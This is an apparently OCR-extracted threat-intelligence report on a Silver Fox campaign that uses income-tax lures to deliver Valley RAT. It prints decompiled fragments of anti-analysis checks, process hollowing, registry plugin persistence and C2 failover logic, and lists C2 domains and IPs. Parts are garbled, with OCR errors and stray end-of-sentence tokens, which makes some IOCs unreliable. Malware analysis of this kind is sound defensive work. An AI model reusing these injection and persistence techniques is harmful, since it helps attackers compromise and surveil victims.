\n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy 